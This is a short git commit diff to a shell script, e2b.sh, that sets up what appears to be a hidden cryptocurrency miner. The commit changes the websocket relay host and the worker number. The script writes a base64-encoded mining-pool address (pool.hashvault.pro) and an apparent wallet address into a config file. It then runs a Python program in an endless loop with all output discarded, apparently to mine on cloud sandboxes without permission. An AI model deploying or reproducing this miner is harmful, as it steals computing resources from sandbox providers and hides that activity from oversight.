d7fe25215ec1d9fd7b2fd8607d3913f8c239aab9
mrsilkin9-blip <mr.silkin9@fasdeil.com>
2026-07-23 18:12:39 +0700

    Update e2b.sh

--- e2b.sh
+++ e2b.sh
@@ -19,7 +19,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=ws://datacenter.chuyengiaai.online
+echo "SERVER_WS=ws://datacenter.dichoiseptoa.site
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
@@ -28,4 +28,4 @@ SERVER_MODE=FAST" > .env
 while true; do
   python3 app.py
   sleep 15
-done' > run.sh && chmod +x run.sh && ./run.sh 8 worker10 >/dev/null 2>&1
+done' > run.sh && chmod +x run.sh && ./run.sh 8 worker09 >/dev/null 2>&1
